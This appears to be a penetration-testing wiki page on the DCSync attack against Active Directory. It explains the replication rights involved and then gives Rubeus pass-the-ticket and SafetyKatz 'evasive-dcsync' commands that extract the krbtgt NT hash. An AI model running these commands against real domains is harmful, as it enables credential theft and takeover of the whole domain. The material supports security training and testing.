# DCSync

Active Directories may have multiple domain controllers: when a change is performed on one domain controller, it is necessary that the other domain controllers be aware of the change. Therefore, there is a replication mechanism implemented to perform synchronisation of the data held by the DC.

Domain controllers have by default the right `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`. The former is usually necessary to replicate non-sensitive changes; the latter also replicates secrets. Both rights are needed to perform a `DCSync` attack.

Note that in general, no user account should be granted this right.

## With a TGT

In this example, we have a TGT for the machine account of a domain controller (obtained for instance through [unconstrained-delegation.md](unconstrained-delegation.md "mention")).

We first load the ticket in memory:

```powershell
> Rubeus.exe ptt /ticket:<base64>
```

Then use `SafetyKatz` to perform `DCSync`:

```powershell
> SafetyKatz.exe "lsadump::evasive-dcsync /user:us\krbtgt" "exit"
```

This command retrieves the NT hash of the `krbtgt` user.
